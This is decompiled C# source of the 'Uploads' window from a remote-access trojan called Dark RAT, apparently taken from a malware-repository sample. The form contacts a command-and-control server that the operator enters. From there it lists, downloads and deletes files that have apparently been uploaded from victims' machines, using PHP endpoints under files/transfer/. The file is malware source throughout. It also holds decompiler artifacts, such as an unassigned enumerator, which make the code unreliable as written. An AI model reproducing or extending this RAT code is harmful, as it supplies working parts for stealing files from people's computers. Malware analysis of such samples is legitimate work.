// Decompiled with JetBrains decompiler
// Type: Dark_RAT.uploads
// Assembly: Dark RAT, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3C824395-872F-43D5-A237-CC243F82B456
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Flooder.gen-66512a2c31adfe77fb66c2c824e55509ba2cce70d158e850f0e56e3dc664f420.exe

using Dark_RAT.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace Dark_RAT
{
  [DesignerGenerated]
  public class uploads : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    [AccessedThroughProperty("ListView1")]
    private ListView _ListView1;
    [AccessedThroughProperty("ColumnHeader1")]
    private ColumnHeader _ColumnHeader1;
    [AccessedThroughProperty("menu")]
    private ContextMenuStrip _menu;
    [AccessedThroughProperty("DeleteToolStripMenuItem")]
    private ToolStripMenuItem _DeleteToolStripMenuItem;
    [AccessedThroughProperty("RefreshToolStripMenuItem")]
    private ToolStripMenuItem _RefreshToolStripMenuItem;
    [AccessedThroughProperty("DeleteToolStripMenuItem1")]
    private ToolStripMenuItem _DeleteToolStripMenuItem1;

    [DebuggerNonUserCode]
    static uploads()
    {
    }

    [DebuggerNonUserCode]
    public uploads()
    {
      this.Load += new EventHandler(this.uploads_Load);
      uploads.__ENCAddToList((object) this);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (uploads.__ENCList)
      {
        if (uploads.__ENCList.Count == uploads.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (uploads.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (uploads.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                uploads.__ENCList[index1] = uploads.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          uploads.__ENCList.RemoveRange(index1, checked (uploads.__ENCList.Count - index1));
          uploads.__ENCList.Capacity = uploads.__ENCList.Count;
        }
        uploads.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (uploads));
      this.ListView1 = new ListView();
      this.ColumnHeader1 = new ColumnHeader();
      this.menu = new ContextMenuStrip(this.components);
      this.DeleteToolStripMenuItem = new ToolStripMenuItem();
      this.DeleteToolStripMenuItem1 = new ToolStripMenuItem();
      this.RefreshToolStripMenuItem = new ToolStripMenuItem();
      this.menu.SuspendLayout();
      this.SuspendLayout();
      this.ListView1.Columns.AddRange(new ColumnHeader[1]
      {
        this.ColumnHeader1
      });
      this.ListView1.ContextMenuStrip = this.menu;
      this.ListView1.Location = new Point(12, 12);
      this.ListView1.Name = "ListView1";
      ListView listView1 = this.ListView1;
      Size size1 = new Size(260, 353);
      Size size2 = size1;
      listView1.Size = size2;
      this.ListView1.TabIndex = 0;
      this.ListView1.UseCompatibleStateImageBehavior = false;
      this.ListView1.View = View.Details;
      this.ColumnHeader1.Text = "Name";
      this.ColumnHeader1.Width = 224;
      this.menu.Items.AddRange(new ToolStripItem[3]
      {
        (ToolStripItem) this.DeleteToolStripMenuItem,
        (ToolStripItem) this.DeleteToolStripMenuItem1,
        (ToolStripItem) this.RefreshToolStripMenuItem
      });
      this.menu.Name = "menu";
      ContextMenuStrip menu = this.menu;
      size1 = new Size(129, 70);
      Size size3 = size1;
      menu.Size = size3;
      this.DeleteToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("DeleteToolStripMenuItem.Image");
      this.DeleteToolStripMenuItem.Name = "DeleteToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem1 = this.DeleteToolStripMenuItem;
      size1 = new Size(128, 22);
      Size size4 = size1;
      toolStripMenuItem1.Size = size4;
      this.DeleteToolStripMenuItem.Text = "Download";
      this.DeleteToolStripMenuItem1.Image = (Image) componentResourceManager.GetObject("DeleteToolStripMenuItem1.Image");
      this.DeleteToolStripMenuItem1.Name = "DeleteToolStripMenuItem1";
      ToolStripMenuItem toolStripMenuItem1_1 = this.DeleteToolStripMenuItem1;
      size1 = new Size(128, 22);
      Size size5 = size1;
      toolStripMenuItem1_1.Size = size5;
      this.DeleteToolStripMenuItem1.Text = "Delete";
      this.RefreshToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("RefreshToolStripMenuItem.Image");
      this.RefreshToolStripMenuItem.Name = "RefreshToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem2 = this.RefreshToolStripMenuItem;
      size1 = new Size(128, 22);
      Size size6 = size1;
      toolStripMenuItem2.Size = size6;
      this.RefreshToolStripMenuItem.Text = "Refresh";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackgroundImage = (Image) componentResourceManager.GetObject("$this.BackgroundImage");
      size1 = new Size(284, 377);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.ListView1);
      this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
      this.MaximizeBox = false;
      this.Name = nameof (uploads);
      this.Text = "Uploads";
      this.menu.ResumeLayout(false);
      this.ResumeLayout(false);
    }

    internal virtual ListView ListView1
    {
      [DebuggerNonUserCode] get => this._ListView1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ListView1 = value;
    }

    internal virtual ColumnHeader ColumnHeader1
    {
      [DebuggerNonUserCode] get => this._ColumnHeader1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ColumnHeader1 = value;
    }

    internal virtual ContextMenuStrip menu
    {
      [DebuggerNonUserCode] get => this._menu;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._menu = value;
    }

    internal virtual ToolStripMenuItem DeleteToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._DeleteToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DeleteToolStripMenuItem_Click);
        if (this._DeleteToolStripMenuItem != null)
          this._DeleteToolStripMenuItem.Click -= eventHandler;
        this._DeleteToolStripMenuItem = value;
        if (this._DeleteToolStripMenuItem == null)
          return;
        this._DeleteToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem RefreshToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._RefreshToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.RefreshToolStripMenuItem_Click);
        if (this._RefreshToolStripMenuItem != null)
          this._RefreshToolStripMenuItem.Click -= eventHandler;
        this._RefreshToolStripMenuItem = value;
        if (this._RefreshToolStripMenuItem == null)
          return;
        this._RefreshToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem DeleteToolStripMenuItem1
    {
      [DebuggerNonUserCode] get => this._DeleteToolStripMenuItem1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DeleteToolStripMenuItem1_Click);
        if (this._DeleteToolStripMenuItem1 != null)
          this._DeleteToolStripMenuItem1.Click -= eventHandler;
        this._DeleteToolStripMenuItem1 = value;
        if (this._DeleteToolStripMenuItem1 == null)
          return;
        this._DeleteToolStripMenuItem1.Click += eventHandler;
      }
    }

    private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        string Expression1 = new WebClient().DownloadString(MyProject.Forms.program.TextBox1.Text + "files/transfer/list.php");
        int Expression2 = Conversions.ToInteger("0");
        this.ListView1.Items.Clear();
        string[] strArray = Strings.Split(Expression1, "\r\n");
        int index = 0;
        while (index < strArray.Length)
        {
          this.ListView1.Items.Add(strArray[index]);
          Expression2 = checked ((int) Math.Round(unchecked (Conversion.Val((object) Expression2) + Conversion.Val("1"))));
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void uploads_Load(object sender, EventArgs e)
    {
    }

    private void RequestToolStripMenuItem_Click(object sender, EventArgs e)
    {
    }

    private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        string str = "";
        try
        {
          foreach (ListViewItem selectedItem in this.ListView1.SelectedItems)
            str = selectedItem.SubItems[0].Text;
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
        MyProject.Computer.Network.DownloadFile(MyProject.Forms.program.TextBox1.Text + "files/transfer/uploads/" + str, Application.StartupPath + "/Downloads/" + str);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void DeleteToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        string str = "";
        try
        {
          foreach (ListViewItem selectedItem in this.ListView1.SelectedItems)
            str = selectedItem.SubItems[0].Text;
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
        new WebClient().DownloadString(MyProject.Forms.program.TextBox1.Text + "files/transfer/delete.php?file=" + str);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
